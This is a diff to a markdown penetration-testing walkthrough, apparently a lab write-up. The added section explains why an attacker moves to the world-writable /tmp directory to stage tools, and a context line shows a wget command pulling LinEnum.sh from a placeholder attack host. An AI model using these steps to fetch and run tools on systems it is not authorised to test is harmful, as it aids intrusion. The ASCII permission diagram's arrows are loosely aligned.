@@ -178,13 +178,44 @@ wget http://<ATTACK_IP>:8080/LinEnum.sh
 
 **Issue:** User home directory lacks write privileges - file transfer fails
 
-### Step 2: Writable Directory Discovery
+### Step 2: Writable Directory Discovery & /tmp Strategy
 Navigated to `/tmp` directory which typically allows write access:
 ```bash
 cd /tmp
 ```
 
 **Verified:** `/tmp` directory writable by current user
+
+**Why /tmp Instead of User Home?**
+
+Understanding file system permissions is critical for privilege escalation enumeration:
+
+**User Home Directory (/home/username/):**
+- Permissions: `drwx------` or `drwxr-xr-x` (restrictive)
+- Owner: User who owns that home directory
+- Write Access: Only the owning user can write
+- Current User Status: May not have write permissions if running as www-data, apache, or other service user
+- **Result:** File download fails due to permission denied
+
+**/tmp Directory (Temporary Files):**
+- Permissions: `drwxrwxrwt` (world-writable sticky bit)
+- Purpose: Temporary storage accessible to all users
+- Write Access: **All users can write** (universal write capability)
+- Sticky Bit (`t`): Prevents users from deleting other users' files, but allows write
+- **Result:** Any user can download and execute files here
+
+**Permission Breakdown:**
+```
+drwxrwxrwt
+│││││││││
+│││││││└─ Others can write (w)
+│││││││
+││││└──── Sticky bit set (t = restricted deletion)
+│││
+└──────── Owner, Group, Others all have read+write+execute
+```
+
+**Lesson:** When initial file transfer fails to home directory, always pivot to `/tmp` or other world-writable directories. This is a fundamental privilege escalation technique.
 
 ### Step 3: LinEnum.sh Download to Writable Location
 **On Attack Machine - Start HTTP Server:**
